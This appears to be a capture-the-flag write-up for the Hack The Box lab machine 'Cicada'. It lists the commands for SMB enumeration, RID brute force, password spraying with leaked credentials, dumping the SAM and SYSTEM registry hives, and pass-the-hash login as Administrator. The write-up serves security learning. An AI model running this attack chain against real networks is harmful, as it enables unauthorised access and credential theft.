# HTB - Cicada

**IP Address:** `10.10.11.35`  
**OS:** Windows Server 2022  
**Difficulty:** Medium  
**Tags:** #SMB, #Kerberos, #RIDBruteForce, #WinRM, #PrivilegeEscalation, #BackupOperators, #HiveDumping

---

## 1. Port Scanning

### 1.1 Nmap

Initial scan revealed a typical Active Directory environment:

```bash
nmap -p- --open 10.10.11.35
```

Filtered scan on relevant ports:

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,63646 10.10.11.35
```

---

## 2. SMB and Domain Enumeration

### 2.1 Identify Host

```bash
netexec smb 10.10.11.35
```

Revealed domain: `cicada.htb`  
Host: `Windows Server 2022 Build 20348`

---

## 3. User Enumeration Attempts

### 3.1 Kerbrute (🛑 Ineffective)

```bash
kerbrute userenum --dc 10.10.11.35 -d cicada.htb /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```

Only found `administrator` and `guest`.

---

## 4. SMB Share Discovery

```bash
smbclient -L 10.10.11.35 -N
netexec smb 10.10.11.35 -u guest -p '' --shares
```

Found share: `HR`

Inspected HR share:

```bash
smbmap -H 10.10.11.35 -u guest -p '' -r HR
```

Discovered:

```text
Notice_from_HR.txt → Cicada$M6Corpb*@Lp#nZp!8
```

---

## 5. User Discovery via RID Brute Force

Used RID brute-force to extract usernames:

```bash
netexec smb 10.10.11.35 -u guest -p '' --rid-brute | grep 'SidTypeUser'
```

Cleaned output with `tr`, `awk`, and `sponge` to create `users.txt`.

Validated users via:

```bash
kerbrute userenum --dc 10.10.11.35 -d cicada.htb users.txt
```

---

## 6. Credential Spraying

Tested the leaked password against all users:

```bash
netexec smb 10.10.11.35 -u users.txt -p credentials.txt
```

✅ Valid for `michael.wrightson`

---

## 7. Michael Wrightson Access

WinRM: ❌ Not available  
SMB Shares:

```bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --shares
```

Found: `NETLOGON`, `SYSVOL`

Checked user descriptions:

```bash
netexec smb 10.10.11.35 -u 'michael.wrightson' -p credentials.txt --users
```

Found password in `david.orelious` description:  
**`aRt$Lp#7t*VQ!3`**

---

## 8. David Orelious Access

✅ SMB login successful  
WinRM: ❌  
New share accessible: `DEV`

```bash
smbmap -H 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' -r DEV
```

Found: `Backup_script.ps1`  
Extracted with `smbclient`

Found credentials:

- User: `emily.oscars`
- Password: `Q!3@Lp#M6b*7t*Vt`

---

## 9. Emily Oscars Access

✅ WinRM access confirmed:

```bash
evil-winrm -i 10.10.11.35 -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt'
```

🏁 **User flag obtained**

---

## 10. Privilege Escalation

Emily is a member of **Backup Operators** and has `SeBackupPrivilege`.

### 10.1 Dump Hive Files

On victim:

```powershell
reg save hklm\sam c:\temp\sam.hive
reg save hklm\system c:\temp\system.hive
```

Downloaded with:

```bash
download sam.hive
download system.hive
```

---

## 11. Extract Administrator Hash

```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Used hash with Evil-WinRM:

```bash
evil-winrm -i 10.10.11.35 -u 'Administrator' -H <NTLM_HASH>
```

🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE
